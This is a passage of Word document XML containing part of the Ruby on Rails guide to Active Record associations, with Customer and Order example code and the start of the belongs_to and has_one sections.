    <w:p w14:paraId="4BE3A016" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="99"/>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Understand the various types of Active Record associations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768159FC" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="99"/>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Use the methods added to your models by creating associations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B660B43" w14:textId="77777777" w:rsidR="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1"/>
    <w:p w14:paraId="74CAE6C6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>1 Why Associations?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2704272D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Why do we need associations between models? Because they make common operations simpler and easier in your code. For example, consider a simple Rails application that includes a model for customers and a model for orders. Each customer can have many orders. Without associations, the model declarations would look like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="236D0B4E" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="655FBCE4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24DE64FA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02D47EC0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D0F3A82" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C444DE4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="29578342" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Now, suppose we wanted to add a new order for an existing customer. We’d need to do something like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="2F985176" w14:textId="77777777" w:rsidTr="004A5FA5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9346" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DADCCD9" w14:textId="6BBD6304" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="004A5FA5">
            <w:pPr>
              <w:ind w:rightChars="-1333" w:right="-2799"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@order</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Order.create(:order_date</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; Time.now,</w:t>
            </w:r>
            <w:r w:rsidR="004A5FA5">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>:customer_id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @customer.id)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0179F14A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Or consider deleting a customer, and ensuring that all of its orders get deleted as well:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6191"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="42C8909D" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3E2A5A0E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@orders</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Order.where(:customer_id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @customer.id)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79CDB170" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@orders.each</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|order|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="631CFFA2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  order.destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A87E40F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A44F71A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@customer.destroy</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2360ADBB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>With Active Record associations, we can streamline these — and other — operations by declaratively telling Rails that there is a connection between the two models. Here’s the revised code for setting up customers and orders:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5424"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="61B94DCA" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4EF5987A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EE76D57" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders, :dependent</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F5A8775" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F0B8013" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="573D3A4F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62F2C7A2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16E17103" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1CEA2616" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>With this change, creating a new order for a particular customer is easier:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6911"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="3DED2C67" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5DC3DC74" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="891188457"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@order</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @customer.orders.create(:order_date</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; Time.now)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4ECD323A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Deleting a customer and all of its orders is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>much</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> easier:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2256"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="4D829777" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="310CA780" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="1244488963"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@customer.destroy</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="25F99263" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To learn more about the different types of associations, read the next section of this guide. That’s followed by some tips and tricks for working with associations, and then by a complete reference to the methods and options for associations in Rails.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7271B7DA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>2 The Types of Associations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA728E0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In Rails, an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a connection between two Active Record models. Associations are implemented using macro-style calls, so that you can declaratively add features to your models. For example, by declaring that one model </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> another, you instruct Rails to maintain Primary Key–Foreign Key information between instances of the two models, and you also get a number of utility methods added to your model. Rails supports six types of associations:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD7C476" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6298A75A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15590249" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12B97527" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many :through</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD00958" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one :through</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B036D4E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D851862" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In the remainder of this guide, you’ll learn how to declare and use the various forms of associations. But first, a quick introduction to the situations where each association type is appropriate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260559A5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.1 The </w:t>
      </w:r>
      <w:r w:rsidRPr="004A5FA5">
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Association</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364CD41A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association sets up a one-to-one connection with another model, such that each instance of the declaring model “belongs to” one instance of the other model. For example, if your application includes customers and orders, and each order can be assigned to exactly one customer, you’d declare the order model this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3984"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="7E5EA022" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C71B606" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7160D014" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A1B8F8B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0F3233FD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0ECF8CB6" wp14:editId="4B55DD16">
            <wp:extent cx="6096000" cy="3143250"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="11" name="图片 11" descr="belongs_to Associ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longs_to Association Diagram"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId206" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6096000" cy="3143250"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1401194D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.2 The </w:t>
      </w:r>
      <w:r w:rsidRPr="004A5FA5">
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Association</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09344EC8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association also sets up a one-to-one connection with another model, but with somewhat different semantics (and consequences). This association indicates that each instance of a model contains or possesses one instance of another model. For example, if each supplier in your application has only one account, you’d declare the supplier model like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
